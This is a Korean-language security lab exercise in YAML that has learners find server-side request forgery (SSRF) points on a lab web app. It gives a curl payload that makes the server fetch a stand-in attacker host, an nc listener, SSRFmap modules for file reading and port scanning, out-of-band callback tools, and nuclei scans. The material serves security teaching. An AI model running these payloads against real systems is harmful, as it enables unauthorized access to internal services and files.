objectives:
- SSRF 공격 원리를 이해한다
- 내부 서비스 접근을 실습한다
- SSRF 방어 기법을 학습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: |-
    {{WEB_IP}} 대상으로 SSRF 취약점 포인트 식별을 수행하시오.

    ■ 실습 방법

    ▶ 1단계: SSRF 가능 위치 카탈로그
    | 위치 | 예 |
    |---|---|
    | 외부 URL fetch | image preview / OG meta / RSS / sitemap |
    | webhook | Slack/Discord webhook 등록 |
    | 파일 import | URL 으로 파일 업로드 |
    | PDF generator | URL → PDF 변환 |
    | URL shortener | 자체 호스팅 |
    | proxy/forward | API gateway / SSO callback |

    ▶ 2단계: 도구 A — curl 으로 SSRF 시도
    ```bash
    # JuiceShop 의 image fetch endpoint
    curl -X PUT "http://10.20.30.80/api/Users/1" \
      -H "Authorization: Bearer $JWT" \
      -H 'Content-Type: application/json' \
      -d '{"profileImage":"http://attacker:9999/test.png"}'
    # attacker 서버에 요청이 도달하면 SSRF 확인
    nc -lvnp 9999  # 도달 확인
    echo "SSRF 취약점 포인트 식별 완료"
    ```

    ▶ 3단계: 도구 B — SSRFmap (자동 SSRF 탐지)
    설치: `git clone https://github.com/swisskyrepo/SSRFmap`. 사용:
    ```bash
    cd ~/SSRFmap
    python3 ssrfmap.py -r request.txt -p url -m readfiles,portscan,redis,fastcgi
    # request.txt: Burp 으로 캡처한 raw HTTP request
    # -p: 변경할 파라미터
    # -m: 모듈 (readfiles/portscan/redis/fastcgi/imds 등 30+)
    ```

    ▶ 4단계: 도구 C — Burp Collaborator (OOB 검증)
    1. Burp Pro: Burp Collaborator → unique subdomain 발급
    2. 의심 endpoint 에 collaborator URL 주입 (`http://abc.burpcollab.com`)
    3. 서버가 fetch 시도 시 자동 캡처 (DNS / HTTP / SMTP)

    ▶ 5단계: 도구 D — interactsh (Burp Collaborator 대체, 무료)
    ```bash
    # 서버 측
    git clone https://github.com/projectdiscovery/interactsh
    cd interactsh && go run cmd/interactsh-server/main.go -domain interact.sh
    # 클라이언트
    interactsh-client -url http://attacker.com -session
    # → unique URL 발급 → SSRF 페이로드에 사용
    ```

    ▶ 6단계: 도구 E — nuclei SSRF 템플릿
    ```bash
    nuclei -u http://10.20.30.80 -t http/vulnerabilities/ -tags ssrf -silent
    nuclei -u http://10.20.30.80 -t http/cves/ -tags ssrf -silent
    ```

    ▶ 7단계: 답변
    SSRF endpoint + nc/interactsh 도달 로그 quote + OWASP A10 매핑.
